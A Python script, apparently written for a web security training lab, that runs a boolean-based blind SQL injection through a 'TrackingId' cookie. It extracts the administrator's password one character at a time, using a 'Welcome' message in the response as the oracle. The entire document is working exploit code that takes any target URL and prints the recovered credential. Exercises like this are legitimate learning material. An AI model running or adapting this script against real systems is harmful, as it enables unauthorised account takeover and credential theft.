import sys
import urllib3
from urllib.parse import quote
import requests
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}


def sqli_password(url):
    password_extracted = ""
    for i in range(1, 21):
        for j in range(32, 126):
            sqli_payload = "' and (select ASCII(substring(password,%s,1)) from users where username='administrator')=%s--" % (i, j)
            sqli_payload_encoded = quote(sqli_payload)
            cookie = {'TrackingId': 'VxuaH4OIXGMb3B0F' +
                      sqli_payload_encoded, 'session': 'uwAM13rs6kGOLS0XswNn7ePMm1rcabz7'}
            r = requests.get(url, cookies=cookie,
                             verify=False, proxies=proxies)

            if 'Welcome' not in r.text:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()
            else:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print('[-] Example: %s "www.example.com"' % sys.argv[0])
        sys.exit(0)

    start_time = time.time()

    print("[+] Retrieving administrator password...")
    sqli_password(url)

    end_time = time.time()
    elapsed_time = end_time - start_time

    print(f"\nThe elapsed time is {elapsed_time} seconds.")
